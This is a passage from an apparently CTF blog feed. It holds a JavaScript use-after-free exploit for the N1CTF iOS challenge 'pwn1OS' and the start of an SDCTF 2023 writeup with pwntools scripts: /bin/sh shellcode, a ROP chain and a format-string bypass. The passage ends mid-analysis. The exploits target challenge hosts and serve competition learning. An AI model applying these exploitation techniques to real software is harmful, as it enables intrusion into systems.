class="attr">base_address</span>:           <span class="number">0x0000000100000000</span>,</span><br><span class="line">        <span class="attr">corefoundation_base</span>:    <span class="number">0x0000000180329000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSArrayI_Class</span>:         <span class="number">0x00000001DE53ABF8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSInvocation_Class</span>:     <span class="number">0x00000001de53a658</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSBooleanFalse</span>:         <span class="number">0x00000001da63a0b8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSData_Class</span>:           <span class="number">0x00000001DE3719C8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSConcreteData_Class</span>:   <span class="number">0x00000001de542370</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">foundation_corefoundation_offset</span>:<span class="number">0x1311000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">foundation_base</span>:        <span class="number">0x000000018163A000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">HTTRequest_Class</span>:       <span class="number">0x0000000100013300</span>,</span><br><span class="line">        <span class="attr">CoreService_Class</span>:      <span class="number">0x0000000100013238</span>,</span><br><span class="line">        <span class="attr">BackDoor_Class</span>:         <span class="number">0x0000000100013120</span>,</span><br><span class="line">        <span class="attr">getFlag_SEL</span>:            <span class="number">0x000000010000D99B</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy from CVE-2021-1784</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        n1ctf.$setChallenge_(obj)</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            n1ctf.$challenge()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="built_in">console</span>.debug(e)</span><br><span class="line">            <span class="keyword">const</span> match = <span class="regexp">/instance (0x[\da-f]+)$/i</span>.exec(e)</span><br><span class="line">            <span class="keyword">if</span> (match) <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">process_leak_data</span>(<span class="params">leak</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// find &#x27;bytes = &#x27; in leak_data, get all bytes after it, remove the last &#x27;&#125;&#x27;</span></span><br><span class="line">        leak = leak.split(<span class="string">&#x27;bytes = &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&#125;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">// remove the first 0x</span></span><br><span class="line">        leak = leak.slice(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// the leak is 24 bytes, split to 3 parts, each 8 bytes</span></span><br><span class="line">        leak = leak.match(<span class="regexp">/\w&#123;16&#125;/g</span>);</span><br><span class="line">        <span class="comment">// for each part, reverse the bytes order</span></span><br><span class="line">        leak = leak.map(<span class="function"><span class="params">x</span> =&gt;</span> x.match(<span class="regexp">/\w&#123;2&#125;/g</span>).reverse().join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="comment">// convert to number</span></span><br><span class="line">        leak = leak.map(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">BigInt</span>(<span class="string">&quot;0x&quot;</span> + x, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c1 = n1ctf.$makeCoreService()</span><br><span class="line">    <span class="built_in">window</span>.c1 = c1;</span><br><span class="line">    <span class="built_in">window</span>.data_array = [];</span><br><span class="line"></span><br><span class="line">    corefoundation_addr = addrof(<span class="literal">false</span>)</span><br><span class="line">    n1ctf.$DEBUGLOG_(corefoundation_addr);</span><br><span class="line"></span><br><span class="line">    corefoundation_addr = <span class="built_in">parseInt</span>(corefoundation_addr, <span class="number">16</span>)</span><br><span class="line">    corefoundation_addr -= offsets.NSBooleanFalse;</span><br><span class="line">    corefoundation_slide = corefoundation_addr;</span><br><span class="line">    corefoundation_addr += offsets.corefoundation_base;</span><br><span class="line">    foundation_addr = corefoundation_addr + offsets.foundation_corefoundation_offset;</span><br><span class="line">    foundation_slide = foundation_addr - offsets.foundation_base;</span><br><span class="line">    <span class="comment">// to hex</span></span><br><span class="line">    coreservice = n1ctf.$makeCoreService();</span><br><span class="line"></span><br><span class="line">    coreservice_addr = addrof(coreservice)</span><br><span class="line">    n1ctf.$DEBUGLOG_(coreservice_addr);</span><br><span class="line">    coreservice_addr = <span class="built_in">parseInt</span>(coreservice_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make HTTRequest</span></span><br><span class="line">    req = n1ctf.$makeHTTRequest();</span><br><span class="line"></span><br><span class="line">    req_addr = addrof(req);</span><br><span class="line">    req_addr = <span class="built_in">parseInt</span>(req_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    c1_addr = addrof(c1);</span><br><span class="line">    c1_addr = <span class="built_in">parseInt</span>(c1_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    <span class="comment">// leak isa and cancelRequest of c1</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">         p64(c1_addr) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save coreservice</span></span><br><span class="line">    <span class="built_in">window</span>.coreservice = coreservice;</span><br><span class="line">    coreservice.dealloc();    <span class="comment">// use-after-free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// base64</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line">    n1ctf.$describeObject__(coreservice);</span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;coreservice&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    <span class="comment">// calculate the base address of pwn1OS</span></span><br><span class="line">    pwn1OS_base = leak_data[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFFFFFFn</span>;</span><br><span class="line">    pwn1OS_base -= (<span class="built_in">BigInt</span>(offsets.CoreService_Class) + <span class="number">1n</span>);</span><br><span class="line">    pwn1OS_base += <span class="number">0x0000000100000000n</span>;</span><br><span class="line"></span><br><span class="line">    c1_invocation_addr = addrof(c1.$cancelRequest());</span><br><span class="line">    c1_invocation_addr = <span class="built_in">parseInt</span>(c1_invocation_addr, <span class="number">16</span>);</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;target: &quot;</span> + c1_invocation_addr.toString(<span class="number">16</span>));</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;fake NSConcreteData: &quot;</span> + addrof(<span class="built_in">window</span>.coreservice));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    <span class="comment">// leak the tagged NSMethodSignature</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">         p64(c1_invocation_addr + <span class="number">0x18</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    coreservice.dealloc();    <span class="comment">// use-after-free</span></span><br><span class="line">    <span class="built_in">window</span>.data_array = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;coreservice&#125;</span>`</span></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;leak tagged NSMethodSignature&quot;</span>);</span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    tagged_NSMethodSignature = leak_data[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    c2 = n1ctf.$makeCoreService();</span><br><span class="line">    <span class="built_in">window</span>.c2 = c2;</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;target: &quot;</span> + c1_invocation_addr.toString(<span class="number">16</span>));</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;fake NSConcreteData: &quot;</span> + addrof(<span class="built_in">window</span>.c2));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload, leak the cookie</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">        p64(c1_invocation_addr + <span class="number">0x30</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">        p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    c2.dealloc();</span><br><span class="line">    <span class="built_in">window</span>.data_array2 = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array2.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    introduction1 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;c2&#125;</span>`</span></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;leak cookie&quot;</span>);</span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    cookie = leak_data[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.introduction1 = introduction1;</span><br><span class="line">    introduction1_addr = addrof(introduction1);</span><br><span class="line">    introduction1_addr = <span class="built_in">parseInt</span>(introduction1_addr, <span class="number">16</span>);</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;introduction1_addr: &quot;</span> + introduction1_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.data_array3 = [];</span><br><span class="line">    <span class="built_in">window</span>.c1.$setCancelRequest_(<span class="built_in">window</span>.introduction1);</span><br><span class="line"></span><br><span class="line">    n1i1 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    n1i2 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    n1i3 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line"></span><br><span class="line">    n1i1.setP_(<span class="string">&quot;http://aaa.aaa.aaa.aaa:aaaaa///pleasegivemetheflag&quot;</span>);</span><br><span class="line">    addrof_p = addrof(n1i1.p());</span><br><span class="line"></span><br><span class="line">    n1i2.dealloc();</span><br><span class="line">    n1i3.dealloc();</span><br><span class="line"></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;spray fake NSInvocation&quot;</span>);</span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    fake_invok = p64(corefoundation_slide + offsets.NSInvocation_Class) + p64(introduction1_addr +<span class="number">0x50</span>) +</span><br><span class="line">         p64(introduction1_addr + <span class="number">0x80</span>) + p64(tagged_NSMethodSignature) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.BackDoor_Class)) + p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.getFlag_SEL)) +</span><br><span class="line">         p64(cookie) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.BackDoor_Class)) + p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.getFlag_SEL)) +</span><br><span class="line">         p64(addrof_p) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    introduction1.$dealloc();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(fake_invok))</span><br><span class="line">        <span class="built_in">window</span>.data_array3.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line">    n1ctf.$describeObject__(introduction1);</span><br><span class="line">    c1.dealloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">`&lt;script type=&quot;application/javascript&quot;&gt;(<span class="subst">$&#123;payload&#125;</span>)()&lt;/script&gt;`</span>.toDataURI()</span><br><span class="line">url = <span class="keyword">new</span> URL(<span class="string">&#x27;n1ctf://web/fyou?url=fme&#x27;</span>)</span><br><span class="line">url.searchParams.set(<span class="string">&#x27;url&#x27;</span>, data);</span><br><span class="line">url.toString()</span><br><span class="line"><span class="built_in">console</span>.log(url.toString())</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF&lt;/h1&gt;
&lt;p&gt;Thank the author for the great challenge. We S1uM4i g</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="Writeup" scheme="https://kpwnz.github.io/tags/Writeup/"/>
    
    <category term="iOS" scheme="https://kpwnz.github.io/tags/iOS/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
    <category term="Userland" scheme="https://kpwnz.github.io/tags/Userland/"/>
    
  </entry>
  
  <entry>
    <title>SDCTF 2023 Writeup</title>
    <link href="https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/"/>
    <id>https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/</id>
    <published>2023-05-08T19:41:03.000Z</published>
    <updated>2023-05-08T13:42:40.346Z</updated>
    
    <content type="html"><![CDATA[<h1>SDCTF 2023 Writeup</h1><p>I was so excited to participate in my first SDCTF event as an incoming student of UC San Diego. :-) It was a great opportunity to learn new skills, meet awesome people and have fun solving challenges. I really enjoyed the experience and I can’t wait for the next one!</p><!-- TOC --><ul><li><a href="#sdctf-2023-writeup">SDCTF 2023 Writeup</a><ul><li><a href="#pwn">PWN</a><ul><li><a href="#turtle-shell">Turtle Shell</a></li><li><a href="#tropic-thunder">tROPic-thunder</a></li><li><a href="#money-printer">money-printer</a></li><li><a href="#money-printer2">money-printer2</a><ul><li><a href="#rtld_global"><code>rtld_global</code></a></li><li><a href="#canary">Canary</a></li></ul></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#secure-runner">Secure Runner</a></li><li><a href="#fork-bomb-protector">Fork bomb protector</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#jumbled-snake">Jumbled snake</a></li><li><a href="#lake-of-pseudo-random-fire">Lake of Pseudo Random Fire</a></li></ul></li></ul></li></ul><!-- /TOC --><h2 id="PWN">PWN</h2><h3 id="Turtle-Shell">Turtle Shell</h3><p>Bypass the checking with <code>add rax, 0x1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./turtle-shell&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;turtle.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">pushrsi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">pushrdi</span></span><br><span class="line"><span class="string">pushrsp</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">mov al,58</span></span><br><span class="line"><span class="string">add     al, 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;shell&#x27;</span>, asm(shellcode))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="tROPic-thunder">tROPic-thunder</h3><p>Use <code>open</code>, <code>read</code> and <code>write</code> to read flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./tROPic-thunder&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;thunder.sdc.tf&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># Gadgets</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040165c</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004589f5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000459747</span></span><br><span class="line">bss = <span class="number">0x00000000006D93A0</span></span><br><span class="line">prompt = <span class="number">0x00000000004C4A7F</span></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    prompt,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x400c6a\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">112</span>+<span class="number">8</span>)+payload</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;send&#x27;</span>, <span class="string">b&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="money-printer">money-printer</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0x3E8</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;wow you&#x27;ve printed money out of thin air, you have %u!!! Is there anything you would like to say to the audience?\n&quot;</span>,</span><br><span class="line">    v6);</span><br><span class="line">  fgets(format, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wow you said: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nthat&#x27;s truly fascinating!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v6</code> is unsigned int but all check against <code>v4</code> is signed operation, so we can bypass the check with negative number.<br>Then use the format string to leak flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./money-printer&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;money.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">money = <span class="number">0xFFFFFB00</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(money))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr = [<span class="number">0x22c3260</span>,<span class="number">0x34647b6674636473</span>,<span class="number">0x665f7530795f6e6d</span>,<span class="number">0x435f345f446e7530</span>,<span class="number">0x304d345f597a3472</span>,<span class="number">0x4d5f66305f374e75</span>,<span class="number">0x79336e30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="comment"># convert to string</span></span><br><span class="line">    <span class="comment"># print(bytes.fromhex(hex(i)[2:]).decode(&#x27;utf-8&#x27;), end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(p64(i).decode(), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="money-printer2">money-printer2</h3><p>I didn’t manage to brute force the address before the CTF ended, but I still want to note down the solution.</p><p>Notice that there are some residual address on the stack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffc91e56ce0│+0x0000: 0xfffffb0000000000   ← $rsp</span><br><span class="line">0x00007ffc91e56ce8│+0x0008: 0xfffffef2800004f5</span><br><span class="line">0x00007ffc91e56cf0│+0x0010: 0x0000000000000000   ← $rdi</span><br><span class="line">0x00007ffc91e56cf8│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffc91e56d00│+0x0020: 0x000000000000000b (&quot;</span><br><span class="line">                                                 &quot;?)                                                                                                               </span><br><span class="line">0x00007ffc91e56d08│+0x0028: 0x00007f4026c02660  →   push rbp</span><br><span class="line">0x00007ffc91e56d10│+0x0030: 0x00007ffc91e56d78  →  0x00007ffc91e56e48  →  0x00007ffc91e58170  →  &quot;./money-printer2&quot;</span><br></pre></td></tr></table></figure><p><code>0x00007f4026c02660</code> is in <code>ld.so</code> and <code>0x00007ffc91e56d78</code> points the the stack.</p><p>So we basically have two approach:</p><h4 id="rtld-global"><code>rtld_global</code></h4><p>Partially overwrite the address of <code>ld.so</code>, make it point to <code>_rtld_global+3840</code>, where the <code>rtld_lock_default_lock_recursive</code> is stored.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the 